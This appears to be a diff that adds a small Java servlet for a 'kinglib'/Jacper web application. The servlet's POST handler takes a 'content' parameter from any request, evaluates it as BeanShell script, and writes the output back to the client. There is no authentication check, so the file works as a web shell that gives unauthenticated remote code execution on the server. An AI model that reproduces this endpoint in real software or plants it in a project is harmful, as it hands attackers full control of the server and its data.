@@ -1,0 +1,34 @@
+
+import java.io.IOException;
+import com.kinglib.*;
+
+
+import com.kinglib.util.Strings;
+import bsh.Interpreter;
+import java.util.Map;
+import java.io.*;
+                                                                                                                           
+@class{
+public void doPost(Jacper jacper){
+  		Interpreter inter = new Interpreter();
+		String content = jacper.getStr("content");
+		if(!content.equals("")){
+			PrintStream out=System.out;
+			PrintStream ps=null;
+			try{
+			ps=new PrintStream(jacper.getResponse().getOutputStream(),false,"utf-8");
+			}catch(Exception ea){
+				jacper.print(jacper.trans("运行失败,系统内部错误"));
+			}
+			try{
+				inter.set("ENV",jacper);
+				System.setOut(ps);
+				inter.eval(content);
+			}catch(Exception e){
+				jacper.print(jacper.trans("运行失败,错误原因")+":<br>");
+				e.printStackTrace(ps);
+			}
+			System.setOut(out);
+		}
+}
+}
